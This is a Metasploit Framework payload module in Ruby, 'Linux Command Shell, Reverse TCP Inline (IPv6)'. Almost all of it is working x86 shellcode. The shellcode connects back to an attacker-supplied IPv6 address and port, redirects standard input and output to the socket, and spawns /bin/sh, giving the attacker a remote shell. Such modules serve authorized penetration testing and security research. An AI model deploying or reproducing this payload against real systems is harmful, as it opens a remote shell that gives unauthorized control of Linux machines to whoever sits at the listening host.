##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 170

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'Matteo Malvica',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))
  end

  def generate
      my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
      first_dword  = my_ipv6[0]
      second_dword = my_ipv6[1]
      third_dword  = my_ipv6[2]
      fourth_dword = my_ipv6[3]
      "\x31\xdb\xf7\xe3\x6a\x06\x6a\x01\x6a\x0a\x89\xe1\xb0\x66\xb3\x01" +
      "\xcd\x80\x89\xc6\x31\xc0\xb0\x02\x31\xdb\xcd\x80\x39\xd8\x74\x02" +
      "\x77\x70\x31\xc9\x31\xdb\x53\x53" +
      "\x68" + fourth_dword +
      "\x68" + third_dword +
      "\x68" + second_dword +
      "\x68" + first_dword +
      "\x53\x66\x68" + [datastore['LPORT'].to_i].pack('S>') +
      "\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x31\xdb\x31\xc0\xb0\x66\xb3" +
      "\x03\x89\xe1\xcd\x80\x31\xdb\x39\xd8\x75\x36\x31\xc9\xf7\xe1\x89" +
      "\xf3\xb0\x3f\xcd\x80\x31\xc0\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xc0" +
      "\x41\x89\xf3\xb0\x3f\xcd\x80\x31\xd2\xf7\xe2\x52\x68\x2f\x2f\x73" +
      "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" +
      "\xc3\x31\xdb\x53\x6a\x0a\xf7\xe3\x89\xe3\xb0\xa2\xcd\x80\xeb\x91" +
      "\xc3\x31\xc0\xb0\x01\xcd\x80"
  end
end
